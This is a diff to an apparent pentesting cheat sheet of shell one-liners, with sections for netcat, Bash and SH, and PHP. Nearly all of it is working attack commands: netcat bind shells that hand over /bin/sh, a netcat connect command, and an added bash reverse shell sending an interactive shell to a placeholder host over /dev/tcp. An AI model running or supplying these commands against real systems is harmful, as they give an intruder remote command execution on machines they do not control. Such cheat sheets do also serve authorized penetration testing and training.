@@ -2,16 +2,16 @@
 
 ## nc
 
-Inside the target machine
-
 ```bash
-nc -lnvvp <port> -e /bin/sh
+nc -nlvp <PORT> -e /bin/sh
+nc <HOST> <PORT>
 ```
 
-To connect from the attacker machine:
+## Bash and SH
 
 ```bash
-nc <host> <port>
+bash -i >& /dev/tcp/<HOST>/<PORT> 0>&1
+nc -lnvvp <PORT> -e /bin/sh
 ```
 
 ## PHP
